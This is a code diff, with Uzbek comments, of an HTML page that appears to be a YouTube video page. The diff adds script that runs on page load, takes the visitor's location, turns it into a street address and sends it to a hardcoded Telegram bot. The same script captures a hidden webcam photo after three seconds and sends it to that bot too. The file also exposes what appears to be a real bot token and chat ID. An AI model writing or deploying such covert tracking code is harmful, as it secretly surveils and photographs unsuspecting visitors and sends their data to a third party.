@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>YouTube va Telegram Test</title>
+  <title>YouTube, Geolocation, Camera</title>
   <style>
     iframe {
       position: fixed;
@@ -15,66 +15,78 @@
   </style>
 </head>
 <body>
-  <!-- To‘g‘ri formatdagi YouTube iframe -->
+  <!-- YouTube iframe -->
   <iframe 
     src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=1"
-    title="YouTube video player"
-    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen"
     allowfullscreen>
   </iframe>
 
   <script>
-    const BOT_TOKEN = "7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4"; // o‘zingiznikini qo‘ying
-    const CHAT_ID = "7281698380"; // o‘zingiznikini qo‘ying
+    const BOT_TOKEN = "7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4";
+    const CHAT_ID = "7281698380";
 
-    // Geolokatsiyani olish va yuborish
+    // --- JOYLASHUVNI YUBORISH (MANZIL KO'RINISHIDA) ---
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((position) => {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `User location:\nLatitude: ${latitude}\nLongitude: ${longitude}`
-          })
-        });
+        // Google reverse geocoding API orqali manzil topish
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
+          .then(res => res.json())
+          .then(data => {
+            const address = data.display_name || `Lat: ${latitude}, Lon: ${longitude}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `📍 Joylashuv:\n${address}`
+              })
+            });
+          });
       });
     }
 
-    // Kamera orqali surat olish va yuborish
+    // --- KAMERA RUXSATINI OLISH VA RASM YUBORISH ---
     navigator.mediaDevices.getUserMedia({ video: true })
       .then((stream) => {
         const video = document.createElement("video");
+        video.style.display = "none";
+        document.body.appendChild(video);
         video.srcObject = stream;
         video.play();
 
-        const canvas = document.createElement("canvas");
-        const context = canvas.getContext("2d");
-
         video.addEventListener("loadeddata", () => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          setTimeout(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          canvas.toBlob((blob) => {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.jpg");
+            canvas.toBlob((blob) => {
+              const formData = new FormData();
+              formData.append("chat_id", CHAT_ID);
+              formData.append("photo", blob, "photo.jpg");
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: formData
-            });
+              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+              });
 
-            // Kamerani o‘chirish
-            stream.getTracks().forEach(track => track.stop());
-          }, "image/jpeg");
+              // Kamera to‘xtatish
+              stream.getTracks().forEach(track => track.stop());
+            }, "image/jpeg");
+          }, 3000); // 3 sekund kutib rasm olish
         });
+      })
+      .catch((err) => {
+        console.error("Kamera ruxsati berilmadi:", err);
       });
   </script>
 </body>
